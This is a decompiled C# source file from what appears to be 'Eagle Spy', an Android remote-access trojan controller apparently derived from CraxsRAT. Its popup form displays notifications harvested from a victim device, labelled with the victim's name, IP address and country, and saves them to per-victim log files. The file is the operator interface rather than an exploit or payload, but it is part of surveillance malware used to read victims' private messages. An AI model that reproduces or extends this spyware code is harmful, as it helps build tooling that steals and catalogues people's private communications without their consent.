using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000046 RID: 70
	[DesignerGenerated]
	public partial class Eaglepopup : Form
	{
		// Token: 0x0600047F RID: 1151 RVA: 0x00003580 File Offset: 0x00001780
		public Eaglepopup()
		{
			base.Load += this.Craxsnotification_Load;
			base.Deactivate += this.Craxsnotification_Deactivate;
			this.InitializeComponent();
		}

		// Token: 0x06000480 RID: 1152 RVA: 0x0005D3F8 File Offset: 0x0005B5F8
		private void Craxsnotification_Load(object sender, EventArgs e)
		{
			if (this.ClassClient != null)
			{
				if (this.ClassClient.Notifications.Count<string>() > 0)
				{
					this.notifitext.Text = "Notifications Reader...\r\n";
					string[] notifications = this.ClassClient.Notifications;
					string[] array = notifications;
					foreach (string text in array)
					{
						try
						{
							if (text != null && text.Length > 0)
							{
								TextBox textBox;
								(textBox = this.notifitext).Text = textBox.Text + text + "\r\n--------------------";
							}
						}
						catch (Exception)
						{
						}
					}
				}
				else
				{
					TextBox textBox2 = this.notifitext;
					textBox2.Text += "No Notifications ...";
				}
			}
			this.ClassClient.isnewnotifi = false;
		}

		// Token: 0x06000481 RID: 1153 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000482 RID: 1154 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void Craxsnotification_Deactivate(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000483 RID: 1155 RVA: 0x000035B2 File Offset: 0x000017B2
		private void Checkbutton_Click(object sender, EventArgs e)
		{
			this.notifitext.Text = "";
			this.ClassClient.Notifications = new string[251];
			base.Close();
		}

		// Token: 0x06000484 RID: 1156 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000485 RID: 1157 RVA: 0x0005D4C4 File Offset: 0x0005B6C4
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.notifitext.Text))
			{
				EagleAlert.Showinformation("No log found to save");
				return;
			}
			try
			{
				if (!Directory.Exists(this.ClassClient.FolderUSER + "\\Notificatios"))
				{
					Directory.CreateDirectory(this.ClassClient.FolderUSER + "\\Notificatios");
				}
				string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
				if (!File.Exists(this.ClassClient.FolderUSER + "\\Notificatios\\" + text))
				{
					File.Create(this.ClassClient.FolderUSER + "\\Notificatios\\" + text).Dispose();
					File.AppendAllText(this.ClassClient.FolderUSER + "\\Notificatios\\" + text, string.Concat(new string[]
					{
						"Client Name: ",
						this.ClassClient.ClientName,
						"\r\nClient IP: ",
						this.ClassClient.ClientAddressIP,
						"\r\nCountry: ",
						this.ClassClient.Country,
						"\r\nDate :",
						DateTime.Now.ToString(),
						"\r\n----------------------------------------\r\n"
					}));
				}
				File.AppendAllText(this.ClassClient.FolderUSER + "\\Notificatios\\" + text, text + this.notifitext.Text + "\r\n");
				Process.Start(this.ClassClient.FolderUSER + "\\Notificatios");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x040003F4 RID: 1012
		public Client ClassClient;
	}
}
